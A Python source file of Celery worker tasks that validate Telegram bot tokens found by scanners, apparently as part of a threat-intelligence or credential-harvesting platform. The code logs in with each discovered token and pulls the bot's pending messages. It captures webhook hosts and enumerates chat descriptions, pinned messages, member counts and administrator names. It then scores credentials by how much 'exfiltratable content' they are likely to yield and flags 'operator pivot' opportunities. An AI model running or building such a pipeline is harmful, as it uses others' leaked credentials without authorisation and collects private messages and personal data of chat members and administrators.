"""
Token validation worker — async validation off the scanner critical path.

Architecture:
    Scanner finds N tokens → enqueues N `validation.validate_token` tasks.
    Dedicated `worker-validators` pulls them off the `validation` queue with
    a Redis-backed global token bucket rate limiter (1 getMe per N seconds
    across ALL validator workers, not per-batch).

Why:
    Old design ran validation INSIDE scanner tasks with VALIDATE_BATCH_CAP=50.
    Result sets > 50 dropped tokens silently, scanner runs took 10-15 min
    blocking the queue, and burst getMe calls triggered Telegram per-IP
    secondary rate limits that cascaded into bot_restricted cooldowns.

Rate limiter:
    Redis key `rate_limit:telegram_getMe` — incremented atomically by every
    worker that calls _acquire_rate_token().  Shared across ALL validator workers
    (processes) because the key lives in Redis, not in process memory.
    If counter > RATE_MAX_CALLS within the window, the calling coroutine sleeps
    until the window expires and retries.
    Default: 30 calls / 10 seconds = ~3 calls/sec sustained.

    There is NO Celery-level rate_limit on validate_token.  A per-worker Celery
    cap would allow each of the N concurrency workers to independently consume
    up to the cap, multiplying burst throughput by N and defeating the Redis gate.
    The Redis bucket is the single, process-global rate control.
"""
import asyncio
import hashlib
import logging
import os
import time

import httpx

from app.core.config import settings
from app.core.database import db
from app.core.security import security
from app.services import validation_queue_srv
from app.services.scanners import _is_valid_token
from app.workers.celery_app import app
from app.workers.tasks.flow_tasks import async_execute, redis_client

logger = logging.getLogger("validation.tasks")
logger.setLevel(logging.INFO)


# ============================================
# RATE LIMITER (Redis token bucket — global across all validator workers)
# ============================================

RATE_LIMIT_KEY = "rate_limit:telegram_getMe"
RATE_MAX_CALLS = int(os.getenv("VALIDATE_RATE_MAX", 30))      # 30 calls...
RATE_WINDOW_SECONDS = int(os.getenv("VALIDATE_RATE_WINDOW", 10))  # ...per 10s
RATE_MAX_WAIT = float(os.getenv("VALIDATE_RATE_MAX_WAIT", 30.0))  # cap blocking time


async def _acquire_rate_token() -> None:
    """
    Atomic token-bucket acquire backed by Redis.

    Uses pipelined INCR + EXPIRE — first call in the window sets TTL.
    If counter exceeds RATE_MAX_CALLS, sleeps until window expires and retries.

    Caps total wait at RATE_MAX_WAIT to avoid worker hangs on rate-storm.
    """
    deadline = time.monotonic() + RATE_MAX_WAIT
    while True:
        # Atomic INCR + conditional EXPIRE
        pipe = redis_client.pipeline()
        pipe.incr(RATE_LIMIT_KEY)
        pipe.ttl(RATE_LIMIT_KEY)
        count, ttl = pipe.execute()

        # Set TTL on first call in window (count==1) OR if TTL is missing.
        # Pipeline executes INCR then TTL atomically, but TTL is read BEFORE
        # INCR takes effect in the same pipeline batch — so first-call detection
        # via count==1 is more reliable than ttl<0 alone.
        if count == 1 or ttl < 0:
            redis_client.expire(RATE_LIMIT_KEY, RATE_WINDOW_SECONDS)
            ttl = RATE_WINDOW_SECONDS

        if count <= RATE_MAX_CALLS:
            return

        # Over budget — sleep until window expires (TTL seconds + jitter)
        sleep_for = max(ttl, 1) + 0.5
        if time.monotonic() + sleep_for > deadline:
            logger.warning(
                f"[RateLimit] Wait would exceed {RATE_MAX_WAIT}s cap "
                f"(count={count}, ttl={ttl}s) — proceeding anyway"
            )
            return
        logger.debug(f"[RateLimit] Over budget ({count}/{RATE_MAX_CALLS}), sleeping {sleep_for}s")
        await asyncio.sleep(sleep_for)


def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()


# ============================================
# VALIDATION TASK
# ============================================

@app.task(
    name="validation.validate_token",
    queue="validation",
    autoretry_for=(httpx.RequestError,),
    retry_backoff=True,
    max_retries=3,
    # NOTE: NO Celery rate_limit here.
    # Throughput is governed entirely by the Redis token bucket in _acquire_rate_token()
    # (key: rate_limit:telegram_getMe, default 30 calls / 10s).
    # A Celery rate_limit="60/m" would be a PER-WORKER cap — with concurrency=4 that
    # allows 4 × 60 = 240 calls/min to escape the Redis gate simultaneously, defeating
    # the global limit entirely.  The Redis bucket is the single source of truth.
)
def validate_token(item: dict, source_name: str = "", queue_row_id: str | None = None):
    """
    Validate a single token from a scanner result.

    Args:
        item: dict with at least {"token": str}, optionally {"chat_id", "meta"}
        source_name: scanner that found this token (for provenance). May be
            empty: when ``queue_row_id`` is supplied the row's ``source`` is
            used instead, because the dispatcher never sends plaintext.
        queue_row_id: optional ``validation_queue`` row this task was dispatched
            for. When present the row is the authority for the token (so a
            replay after a dispatcher crash still works) and the row is closed
            out with ``done``/``pending``/``dropped`` after the attempt.

    The legacy two-argument call path is unchanged: without ``queue_row_id`` no
    queue row is read and no completion write happens.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(
        _validate_token_async(item, source_name, queue_row_id=queue_row_id)
    )


async def _load_queue_row(queue_row_id: str) -> dict | None:
    """Load the staged candidate backing a dispatched ``validate_token``.

    Returns ``None`` when the row is gone (deleted) or unreadable — callers must
    still validate from the task payload rather than raising.
    """
    try:
        res = await async_execute(
            db.table("validation_queue")
            .select("id, token_ciphertext, source, meta, lease_id, status")
            .eq("id", queue_row_id)
            .limit(1)
        )
    except Exception as e:
        logger.warning(f"[Validate] queue row {queue_row_id} could not be loaded: {e}")
        return None
    rows = res.data or []
    return rows[0] if rows else None


async def _complete_queue_row(lease_id: str, queue_row_id: str, success: bool) -> None:
    """Close out one leased queue row; completion failure must never fail the task.

    ``validation_queue_srv.complete`` is idempotent (guarded by ``lease_id`` and
    ``status='leased'``), and this helper is called at most once per attempt.
    """
    try:
        await validation_queue_srv.complete(
            lease_id, [{"queue_row_id": queue_row_id, "success": success}]
        )
    except Exception as e:
        logger.warning(f"[Validate] queue completion failed for row {queue_row_id}: {e}")


async def _validate_token_async(
    item: dict, source_name: str, queue_row_id: str | None = None
) -> int:
    """Validate one candidate and, when dispatched from the queue, close its row.

    ``queue_row_id`` semantics:
    * Row found and decryptable → the row's token wins over the payload token,
      which keeps the queue as the single source of truth.
    * Row found but not currently leased (expired/re-dispatched) → validate but
      skip completion; ``complete`` would be a no-op anyway.
    * Row missing → log a warning and validate from ``item`` when it has a
      token; never raise because the queue raced a delete.
    """
    row_id = str(queue_row_id) if queue_row_id else None
    lease_id: str | None = None

    if row_id:
        row = await _load_queue_row(row_id)
        if row is None:
            logger.warning(
                f"[Validate] queue row {row_id} not found; validating from task payload"
            )
            row_id = None
        else:
            lease_id = row.get("lease_id")
            if not lease_id:
                logger.warning(
                    f"[Validate] queue row {row_id} is not leased; skipping completion"
                )
            # Provenance lives on the row too: the dispatcher sends an empty
            # payload (no plaintext token, no source) so the row is the only
            # source of truth for both the token and its scanner label.
            if not source_name:
                source_name = row.get("source") or "validation_queue"
            row_token = None
            ciphertext = row.get("token_ciphertext")
            if ciphertext:
                try:
                    row_token = security.decrypt(ciphertext)
                except Exception as e:
                    logger.warning(
                        f"[Validate] queue row {row_id} token could not be decrypted: {e}"
                    )
            if row_token:
                item = {**(item or {}), "token": row_token}
                if not item.get("meta"):
                    item["meta"] = row.get("meta") or {}
            elif not (item or {}).get("token"):
                logger.warning(f"[Validate] queue row {row_id} has no usable token; failing row")
                if lease_id:
                    await _complete_queue_row(lease_id, row_id, False)
                return 0
            else:
                logger.warning(
                    f"[Validate] queue row {row_id} token unavailable; using payload token"
                )

    result = await _validate_token_core(item or {}, source_name)

    if row_id and lease_id:
        await _complete_queue_row(lease_id, row_id, bool(result))
    return result


async def _validate_token_core(item: dict, source_name: str) -> int:
    """Returns 1 if saved/updated, 0 otherwise. Legacy validation body."""
    token = item.get("token")
    if not token or token == "MANUAL_REVIEW_REQUIRED":
        return 0

    # Step 1: Format check (cheap — do BEFORE rate-limiting)
    if not _is_valid_token(token):
        logger.debug(f"[Validate] Invalid format: {token[:15]}...")
        return 0

    # Own-bot guard — hard stop before ANY Telegram API call or DB write.
    # MONITOR_BOT_TOKEN covers all our own bots. If a scanner finds our own
    # token (e.g. via telegram_search), drop it here silently.
    if _scraper_srv_is_monitor(token):
        logger.debug("[Validate] Own monitor bot token — silently dropping")
        return 0

    token_hash = _calculate_hash(token)
    extracted_chat_id = item.get("chat_id")

    try:
        # Step 2: Dedupe check — skip if already exists with chat_id
        existing = await async_execute(
            db.table("discovered_credentials")
            .select("id, chat_id, meta")
            .eq("token_hash", token_hash)
        )
        existing_id = None
        existing_meta = {}
        existing_has_chat = False
        if existing.data:
            existing_id = existing.data[0]["id"]
            existing_meta = existing.data[0].get("meta") or {}
            existing_has_chat = existing.data[0].get("chat_id") is not None
            if existing_has_chat:
                logger.debug(f"[Validate] Token {token[:10]}... already has chat_id, skipping")
                return 0

        # Step 3: Rate-limited getMe (the expensive call)
        await _acquire_rate_token()

        # Variables that must outlive the http client block (used in persist step)
        webhook_url = None
        chat_enrichment: dict = {}

        async with httpx.AsyncClient(timeout=10.0) as client:
            base_url = f"https://api.telegram.org/bot{token}"
            me_data = None
            me_res = None
            for attempt in range(2):
                try:
                    me_res = await client.get(f"{base_url}/getMe")
                    me_data = me_res.json()
                    if me_res.status_code == 200 and me_data.get("ok"):
                        break
                except Exception:
                    if attempt == 0:
                        await asyncio.sleep(1)
                    continue

            if not me_res or me_res.status_code != 200 or not me_data.get("ok"):
                logger.debug(
                    f"[Validate] Token invalid (HTTP {me_res.status_code if me_res else 'timeout'})"
                )
                return 0

            bot_info = me_data.get("result", {})
            bot_username = bot_info.get("username", "unknown")
            logger.info(f"[Validate] ✅ @{bot_username} (id={bot_info.get('id')})")

            # ---- Bundle 1.4: getWebhookInfo (capture C2 host if set) ----
            try:
                wh_res = await client.get(f"{base_url}/getWebhookInfo", timeout=5.0)
                if wh_res.status_code == 200:
                    wh_data = wh_res.json()
                    if wh_data.get("ok"):
                        webhook_url = (wh_data.get("result") or {}).get("url") or None
                        if webhook_url:
                            logger.info(f"[Validate] 🪝 webhook → {webhook_url[:80]}")
            except Exception as _swallowed:
                logger.debug(f"[suppressed] {_swallowed}")  # webhook info is bonus; never block the main path

            # ---- Bundle 1: Pivot fan-out (fire-and-forget) ----
            try:
                from app.workers.tasks.pivot_tasks import fan_out_pivots

                # Owner pivots advance the owner graph at most two hops deep;
                # the candidate's meta carries which hop it came from, so a
                # depth-2 candidate never re-enqueues (see MAX_PIVOT_DEPTH).
                fan_out_pivots(
                    item.get("meta") or {},
                    bot_username=bot_username,
                    webhook_url=webhook_url,
                )
            except Exception as e:
                # Pivot failure must NEVER block the main validation pipeline
                logger.debug(f"[Validate] Pivot fan-out failed (non-fatal): {e}")

            # Step 4: Resolve chat_id (extracted > getUpdates > none)
            chat_id = extracted_chat_id
            chat_name = None
            chat_type = None

            if not chat_id:
                from app.services.scraper_srv import scraper_service as _scraper_srv
                if not _scraper_srv.is_monitor_bot(token):
                    try:
                        # getUpdates also counts toward rate budget
                        await _acquire_rate_token()
                        upd_res = await client.get(
                            f"{base_url}/getUpdates", params={"limit": 10}
                        )
                        if upd_res.status_code == 200 and upd_res.json().get("ok"):
                            for update in upd_res.json().get("result", []):
                                for key in ["message", "channel_post", "my_chat_member"]:
                                    if key in update and update[key].get("chat"):
                                        chat = update[key]["chat"]
                                        chat_id = chat.get("id")
                                        chat_name = (
                                            chat.get("title")
                                            or chat.get("username")
                                            or chat.get("first_name")
                                        )
                                        chat_type = chat.get("type")
                                        break
                                if chat_id:
                                    break
                    except Exception as e:
                        logger.warning(f"[Validate] getUpdates failed: {e}")

            # ---- Bundle 4: enrichment + confidence scoring ----
            # Collect richer chat metadata via getChat / getChatAdministrators
            # when we have a chat_id. Best-effort — failures never block save.
            if chat_id:
                chat_enrichment = await _enrich_chat(chat_id, base_url, client)

        # Confidence score derived from collected signals (always computed,
        # outside the http client block — pure data transformation)
        confidence_score, confidence_reasons = _score_credential(
            chat_id=chat_id,
            chat_type=chat_type,
            webhook_url=webhook_url,
            chat_enrichment=chat_enrichment if chat_id else {},
            bot_username=bot_username,
        )

        # Step 5: Persist (UPDATE existing or INSERT new)
        if existing_id and chat_id:
            # Update existing — stored meta wins to preserve enrichment
            merged_meta = {
                **item.get("meta", {}),
                **existing_meta,
                "last_seen_source": source_name,
                "last_verified_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
            }
            if webhook_url:
                merged_meta["webhook_url"] = webhook_url
            if chat_enrichment:
                merged_meta.update(chat_enrichment)
            # Write both keys during rename transition: collection_yield_score is
            # the canonical name; confidence_score is retained as a legacy alias.
            merged_meta["collection_yield_score"] = confidence_score
            merged_meta["confidence_score"] = confidence_score
            merged_meta["collection_yield_reasons"] = confidence_reasons
            merged_meta["confidence_reasons"] = confidence_reasons
            update_data = {
                "chat_id": chat_id,
                "status": "active",
                "meta": merged_meta,
            }
            if chat_name:
                update_data["chat_name"] = chat_name
            if chat_type:
                update_data["chat_type"] = chat_type
            await async_execute(
                db.table("discovered_credentials").update(update_data).eq("id", existing_id)
            )
            logger.info(f"[Validate] 🆙 Updated {existing_id} with chat_id {chat_id}")
            return 1

        if existing_id and not chat_id:
            # Re-queue enrichment with cooldown (per BUG-010)
            from app.core.redis_srv import redis_srv
            cooldown_key = f"enrich_requeue:{existing_id}"
            if not redis_srv.is_on_cooldown(cooldown_key):
                from app.workers.tasks.flow_tasks import enrich_credential
                enrich_credential.delay(existing_id)
                redis_srv.set_cooldown(cooldown_key, 3600)
            return 0

        # New record
        new_data = {
            "bot_token": security.encrypt(token),
            "token_hash": token_hash,
            "chat_id": chat_id,
            "chat_name": chat_name,
            "chat_type": chat_type,
            "bot_id": str(bot_info.get("id")),
            "bot_username": bot_username,
            "source": source_name,
            "status": "pending" if not chat_id else "active",
            "meta": {
                **item.get("meta", {}),
                "bot_username": bot_username,
                "bot_id": bot_info.get("id"),
                "chat_name": chat_name,
                "chat_type": chat_type,
                **({"webhook_url": webhook_url} if webhook_url else {}),
                **(chat_enrichment or {}),
                # Write both keys during rename transition (see migration 20260903000003).
                "collection_yield_score": confidence_score,
                "confidence_score": confidence_score,
                "collection_yield_reasons": confidence_reasons,
                "confidence_reasons": confidence_reasons,
            },
        }
        res = await async_execute(db.table("discovered_credentials").insert(new_data))
        if res.data:
            new_id = res.data[0]["id"]
            status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"

            from app.workers.tasks.flow_tasks import enrich_credential, get_broadcaster
            await get_broadcaster().send_log(
                f"🎯 [{source_name}] **New Bot Token!**\n"
                f"Bot: @{bot_username}\n"
                f"ID: `{new_id}`\n"
                f"Status: {status_label}"
            )
            enrich_credential.delay(new_id)
            return 1

    except Exception as e:
        # Race condition: two validators raced on the same token, second
        # hit unique-constraint violation. Benign — first won, this is a no-op.
        # Postgres code 23505 = unique_violation.
        err_str = str(e)
        if "23505" in err_str or "duplicate key" in err_str.lower():
            logger.debug(f"[Validate] Duplicate token (raced): {token[:10]}... — first writer won")
            return 0
        # Log without exc_info to avoid embedding the raw exception chain which
        # may reference the local `token` variable in some Python traceback frames.
        logger.error(f"[Validate] Error processing token {token[:10]}...: {err_str}")

    return 0


# ============================================
# Priority dispatcher — lease staged candidates onto the validation queue
# ============================================

def _remaining_dispatch_budget() -> int:
    """Unconsumed getMe budget in the shared Redis bucket (consumes nothing).

    The dispatcher must not fan out more validators than the bucket can admit
    within the current window: leasing beyond that leaves rows stuck ``leased``
    (invisible to outposts) while their validators sleep behind the limiter.
    Reading the same ``rate_limit:telegram_getMe`` key keeps a single global
    bucket — :func:`_acquire_rate_token` remains the only consumer.
    """
    try:
        pipe = redis_client.pipeline()
        pipe.get(RATE_LIMIT_KEY)
        pipe.ttl(RATE_LIMIT_KEY)
        used_raw, ttl_raw = pipe.execute()
    except Exception as e:
        # A Redis hiccup must not wedge dispatch; per-task acquisition still
        # enforces the bucket when the worker runs.
        logger.warning(f"[Dispatch] rate bucket read failed ({e}); assuming full budget")
        return RATE_MAX_CALLS

    try:
        ttl = int(ttl_raw)
    except (TypeError, ValueError):
        ttl = -1
    if used_raw is None or ttl < 0:
        return RATE_MAX_CALLS
    try:
        used = int(used_raw)
    except (TypeError, ValueError):
        used = 0
    return max(0, RATE_MAX_CALLS - used)


@app.task(name="validation.dispatch_pending", queue="validation")
def dispatch_pending():
    """Lease highest-priority staged candidates and fan them out.

    Beat entry (owned by celery_app): every
    ``settings.VALIDATION_DISPATCH_INTERVAL_SECONDS`` (15s by default).
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_dispatch_pending_async())


async def _dispatch_pending_async() -> str:
    """One dispatcher pass; returns a small status string.

    Reclaims expired leases first, then leases at most
    ``VALIDATION_DISPATCH_BATCH`` rows capped by the shared getMe bucket. When
    the bucket is exhausted the remaining rows are simply left ``pending`` for
    the next beat tick — leasing and sleeping would hold a worker while making
    the rows invisible to outposts.
    """
    await validation_queue_srv.release_expired()

    try:
        if redis_client.get("system:paused"):
            return "paused"
    except Exception as e:
        logger.warning(f"[Dispatch] pause check failed ({e}); continuing")

    batch = max(0, int(settings.VALIDATION_DISPATCH_BATCH))
    if batch <= 0:
        return "dispatched:0"

    budget = _remaining_dispatch_budget()
    limit = min(batch, budget)
    if limit <= 0:
        logger.info(
            f"[Dispatch] getMe bucket exhausted "
            f"({RATE_MAX_CALLS}/{RATE_WINDOW_SECONDS}s); leaving staged rows pending"
        )
        return "rate_limited:0"

    leased = await validation_queue_srv.lease(
        limit, int(settings.VALIDATION_LEASE_SECONDS)
    )
    if not leased:
        return "dispatched:0"

    dispatched = 0
    for row in leased:
        row_id = row.get("queue_row_id")
        lease_id = row.get("lease_id")
        token = row.get("token")
        if not row_id:
            continue
        if not token:
            # lease() only returns rows whose ciphertext it could decrypt, so a
            # token-less row here is malformed: fail it instead of leaving it
            # leased until the lease expires.
            logger.warning(f"[Dispatch] queue row {row_id} has no plaintext token; failing row")
            if lease_id:
                await _complete_queue_row(lease_id, row_id, False)
            continue
        try:
            validate_token.apply_async(
                # SECURITY (F2 7.7): the broker payload must never carry the
                # plaintext token. The task resolves token, meta and source
                # exclusively from the encrypted validation_queue row via
                # queue_row_id; the row is the single source of truth.
                args=[{}],
                kwargs={"queue_row_id": row_id},
                queue="validation",
            )
        except Exception as e:
            logger.warning(f"[Dispatch] enqueue failed for row {row_id}: {e}")
            if lease_id:
                await _complete_queue_row(lease_id, row_id, False)
            continue
        dispatched += 1

    logger.info(
        f"[Dispatch] leased={len(leased)} dispatched={dispatched} "
        f"limit={limit} (budget={budget}, batch={batch})"
    )
    return f"dispatched:{dispatched}"


# ============================================
# Bundle 2.2: Token validity refresh loop
# ============================================

@app.task(
    name="validation.refresh_pending_tokens",
    autoretry_for=(Exception,),
    retry_backoff=True,
    max_retries=1,
)
def refresh_pending_tokens():
    """Re-enqueue validation for all 'pending' tokens (no chat_id resolved yet).

    Some bot owners activate dormant bots later — re-validating periodically
    recovers chat_id resolution for free.
    """
    from app.workers.celery_app import _run_sync
    return _run_sync(_refresh_pending_tokens_async())


async def _refresh_pending_tokens_async():
    if redis_client.get("system:paused"):
        return "paused"

    # Cursor-based pagination — advances through ALL pending tokens across successive
    # runs instead of re-processing the same oldest-500 every time.
    # Key stores the last-seen `updated_at` ISO string; reset when batch is empty.
    REFRESH_CURSOR_KEY = "refresh_pending:cursor"  # noqa: N806 — function-scoped constant
    REFRESH_BATCH_SIZE = int(os.getenv("REFRESH_PENDING_BATCH_SIZE", 500))  # noqa: N806 — function-scoped constant
    cursor_val = redis_client.get(REFRESH_CURSOR_KEY)

    q = (
        db.table("discovered_credentials")
        .select("id, bot_token, meta")
        .is_("chat_id", "null")
        .order("updated_at", desc=False)
        .limit(REFRESH_BATCH_SIZE)
    )
    if cursor_val:
        q = q.gt("updated_at", cursor_val)
    res = await async_execute(q)
    rows = res.data or []

    # Advance or reset cursor
    try:
        if rows:
            redis_client.set(REFRESH_CURSOR_KEY, rows[-1]["updated_at"], ex=86400 * 7)
        else:
            redis_client.delete(REFRESH_CURSOR_KEY)  # full pass done, restart
            logger.info("[Refresh] Full pending sweep complete, cursor reset.")
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")

    enqueued = 0
    for row in rows:
        encrypted_token = row.get("bot_token")
        if not encrypted_token:
            continue
        try:
            token = security.decrypt(encrypted_token)
        except Exception as _swallowed:
            logger.debug(f"[suppressed] {_swallowed}")
            continue
        if not token:
            continue
        # Re-enqueue (validate_token handles dedup, Redis dedup, getMe)
        validate_token.apply_async(
            args=[{"token": token, "meta": row.get("meta") or {}}, "refresh_pending"],
            queue="validation",
        )
        enqueued += 1
        if enqueued % 50 == 0:
            await asyncio.sleep(1)  # pace the enqueue burst
    logger.info(f"[Refresh] re-enqueued {enqueued} pending tokens")
    return f"refreshed:{enqueued}"


# ============================================
# Bundle 4: enrichment + confidence helpers
# ============================================

async def _enrich_chat(chat_id, base_url: str, client) -> dict:
    """Best-effort getChat + getChatAdministrators enrichment.

    Returns a dict of fields to merge into meta. NEVER raises — every API
    failure logs and returns whatever was collected so far.
    """
    out: dict = {}

    # getChat — description, member_count, pinned_message
    try:
        await _acquire_rate_token()
        cr = await client.get(
            f"{base_url}/getChat", params={"chat_id": chat_id}, timeout=5.0
        )
        if cr.status_code == 200:
            cdata = cr.json()
            if cdata.get("ok"):
                ch = cdata.get("result") or {}
                if ch.get("description"):
                    out["chat_description"] = ch["description"][:500]
                pinned = ch.get("pinned_message") or {}
                pinned_text = pinned.get("text") or pinned.get("caption")
                if pinned_text:
                    out["chat_pinned_text"] = pinned_text[:500]
                if ch.get("invite_link"):
                    out["chat_invite_link"] = ch["invite_link"]
    except Exception as e:
        logger.debug(f"[Validate:enrich] getChat failed: {e}")

    # getChatMemberCount — separate endpoint for groups/supergroups/channels
    try:
        await _acquire_rate_token()
        mr = await client.get(
            f"{base_url}/getChatMemberCount", params={"chat_id": chat_id}, timeout=5.0
        )
        if mr.status_code == 200:
            mdata = mr.json()
            if mdata.get("ok"):
                count = mdata.get("result")
                if isinstance(count, int):
                    out["chat_member_count"] = count
    except Exception as e:
        logger.debug(f"[Validate:enrich] getChatMemberCount failed: {e}")

    # getChatAdministrators — admin user IDs (operator pivot key)
    try:
        await _acquire_rate_token()
        ar = await client.get(
            f"{base_url}/getChatAdministrators", params={"chat_id": chat_id}, timeout=5.0
        )
        if ar.status_code == 200:
            adata = ar.json()
            if adata.get("ok"):
                admins = adata.get("result") or []
                # Only retain user-id + handle pairs, skip the rest (PII volume)
                admin_summaries = []
                for a in admins[:20]:  # cap at 20 to avoid bloat
                    u = a.get("user") or {}
                    if u.get("is_bot"):
                        continue
                    admin_summaries.append({
                        "id": u.get("id"),
                        "username": u.get("username"),
                        "first_name": u.get("first_name"),
                        "status": a.get("status"),
                    })
                if admin_summaries:
                    out["chat_admins"] = admin_summaries
    except Exception as e:
        logger.debug(f"[Validate:enrich] getChatAdministrators failed: {e}")

    if out:
        logger.info(f"[Validate:enrich] +{len(out)} fields for chat={chat_id}")
    return out


def _score_credential(
    *,
    chat_id,
    chat_type: str,
    webhook_url: str,
    chat_enrichment: dict,
    bot_username: str,
) -> tuple:
    """Compute a 0-100 confidence score + list of human-readable reasons.

    Higher = more likely to yield exfiltratable content. Designed for
    dashboard sort-by-value, not gate-keeping.
    """
    score = 0
    reasons = []

    # Base: chat_id resolution alone is the foundation
    if chat_id:
        score += 30
        reasons.append("chat_id_resolved")
    else:
        reasons.append("no_chat_id")

    # Webhook configured = bot is in production use, not a test/abandoned
    if webhook_url:
        score += 20
        reasons.append("webhook_configured")

    # Chat type signal
    if chat_type == "supergroup":
        score += 15
        reasons.append("chat_type_supergroup")
    elif chat_type == "group":
        score += 10
        reasons.append("chat_type_group")
    elif chat_type == "channel":
        score += 12
        reasons.append("chat_type_channel")
    elif chat_type == "private":
        score += 5
        reasons.append("chat_type_private")

    # Member count signal — bigger = more activity to exfiltrate
    member_count = (chat_enrichment or {}).get("chat_member_count")
    if isinstance(member_count, int):
        if member_count >= 1000:
            score += 20
            reasons.append("members_1000+")
        elif member_count >= 100:
            score += 12
            reasons.append("members_100+")
        elif member_count >= 10:
            score += 6
            reasons.append("members_10+")

    # Description present = curated, intentional bot
    if (chat_enrichment or {}).get("chat_description"):
        score += 5
        reasons.append("has_description")

    # Pinned message = admin announcements (often high-value content)
    if (chat_enrichment or {}).get("chat_pinned_text"):
        score += 8
        reasons.append("has_pinned_message")

    # Admins enumerated = operator pivot opportunity
    admins = (chat_enrichment or {}).get("chat_admins") or []
    if len(admins) >= 1:
        score += 5
        reasons.append("admins_enumerated")

    # Cap at 100
    score = min(score, 100)
    return score, reasons


def _scraper_srv_is_monitor(token: str) -> bool:
    """Thin wrapper to call scraper_service.is_monitor_bot without import cycles."""
    try:
        from app.services.scraper_srv import scraper_service as _s
        return _s.is_monitor_bot(token)
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")
        return False


# ============================================================
# Backfill: score + enrich all active rows missing collection_yield_score
# ============================================================

@app.task(name="validation.backfill_scoring", queue="validation")
def backfill_scoring(batch_size: int = 50):
    """Re-run getChat enrichment + yield scoring on active rows
    that have a chat_id but no collection_yield_score in meta yet.
    (Also covers legacy rows keyed only under confidence_score.)

    Does NOT call getMe (token already confirmed live).
    Runs in batches — safe to call repeatedly via beat or manually.
    """
    from app.workers.celery_app import _run_sync
    return _run_sync(_backfill_scoring_async(batch_size))


async def _backfill_scoring_async(batch_size: int):
    import httpx

    from app.core.security import security

    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, bot_token, chat_id, chat_type, bot_username, meta")
        .eq("status", "active")
        .not_.is_("chat_id", "null")
        .or_("meta->>collection_yield_score.is.null,meta->>confidence_score.is.null")
        .order("updated_at", desc=False)
        .limit(batch_size)
    )
    rows = res.data or []
    if not rows:
        logger.info("[Backfill] no rows need scoring — done")
        return 0

    logger.info(f"[Backfill] scoring {len(rows)} rows")
    done = 0
    async with httpx.AsyncClient(timeout=8.0) as client:
        for row in rows:
            try:
                token = security.decrypt(row["bot_token"])
                if _scraper_srv_is_monitor(token):
                    continue
                base_url = f"https://api.telegram.org/bot{token}"
                chat_id = row["chat_id"]
                await _acquire_rate_token()
                enrichment = await _enrich_chat(chat_id, base_url, client)
                score, reasons = _score_credential(
                    chat_id=chat_id,
                    chat_type=row.get("chat_type"),
                    webhook_url=(row.get("meta") or {}).get("webhook_url"),
                    chat_enrichment=enrichment,
                    bot_username=row.get("bot_username"),
                )
                new_meta = {**(row.get("meta") or {}), **enrichment,
                    # Write both keys during rename transition.
                    "collection_yield_score": score,
                    "confidence_score": score,
                    "collection_yield_reasons": reasons,
                    "confidence_reasons": reasons,
                }
                await async_execute(
                    db.table("discovered_credentials")
                    .update({
                        "meta": new_meta,
                        "updated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                    })
                    .eq("id", row["id"])
                )
                done += 1
            except Exception as e:
                logger.warning(f"[Backfill] row {row['id'][:8]} failed: {e}")
                continue
    return done


# ============================================================
# Membership rotation: refresh chat identity + membership state
# ============================================================

@app.task(name="validation.membership_rotation", queue="validation")
def membership_rotation(batch_size: int = 100):
    from app.workers.celery_app import _run_sync

    return _run_sync(_membership_rotation_async(batch_size))


async def _membership_rotation_async(batch_size: int):
    from datetime import UTC, datetime, timedelta

    from app.services.membership_srv import process_membership_update

    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, bot_token, chat_id, chat_name, chat_type, meta")
        .eq("status", "active")
        .order("updated_at", desc=False)
        .limit(batch_size)
    )
    rows = res.data or []
    if not rows:
        return {"status": "ok", "checked": 0, "updated": 0}

    now = datetime.now(UTC)
    checked = 0
    updated = 0
    async with httpx.AsyncClient(timeout=8.0) as client:
        for row in rows:
            try:
                token = security.decrypt(row["bot_token"])
                if _scraper_srv_is_monitor(token):
                    continue
                base_url = f"https://api.telegram.org/bot{token}"

                await _acquire_rate_token()
                wh_res = await client.get(f"{base_url}/getWebhookInfo")
                webhook_url = ""
                if wh_res.status_code == 200 and wh_res.json().get("ok"):
                    webhook_url = (wh_res.json().get("result") or {}).get("url") or ""
                if webhook_url:
                    continue

                await _acquire_rate_token()
                upd_res = await client.get(
                    f"{base_url}/getUpdates",
                    params={"limit": 10, "allowed_updates": '["my_chat_member"]'},
                )
                if upd_res.status_code == 200 and upd_res.json().get("ok"):
                    for update in upd_res.json().get("result", []):
                        if "my_chat_member" not in update:
                            continue
                        result = await process_membership_update(update, row["id"])
                        if result and result.get("status") == "ok":
                            updated += 1

                meta = dict(row.get("meta") or {})
                last_getchat = meta.get("membership_last_getchat_at")
                needs_getchat = not last_getchat
                if last_getchat:
                    try:
                        parsed = datetime.fromisoformat(last_getchat.replace("Z", "+00:00"))
                        needs_getchat = now - parsed > timedelta(hours=24)
                    except (TypeError, ValueError):
                        needs_getchat = True

                if needs_getchat and row.get("chat_id"):
                    await _acquire_rate_token()
                    chat_res = await client.get(
                        f"{base_url}/getChat", params={"chat_id": row["chat_id"]}
                    )
                    if chat_res.status_code == 200 and chat_res.json().get("ok"):
                        chat = chat_res.json()["result"]
                        patch = {
                            "chat_name": (
                                chat.get("title")
                                or chat.get("username")
                                or chat.get("first_name")
                            ),
                            "chat_type": chat.get("type"),
                        }
                        await async_execute(
                            db.table("discovered_credentials")
                            .update(
                                {**patch, "updated_at": time.strftime("%Y-%m-%dT%H:%M:%S")}
                            )
                            .eq("id", row["id"])
                        )
                        updated += 1

                meta["membership_last_checked_at"] = now.isoformat()
                if needs_getchat:
                    meta["membership_last_getchat_at"] = now.isoformat()
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"meta": meta, "updated_at": time.strftime("%Y-%m-%dT%H:%M:%S")})
                    .eq("id", row["id"])
                )
                checked += 1
            except Exception as e:
                logger.warning(f"[MembershipRotation] row {row['id'][:8]} failed: {e}")
                continue
    return {"status": "ok", "checked": checked, "updated": updated}
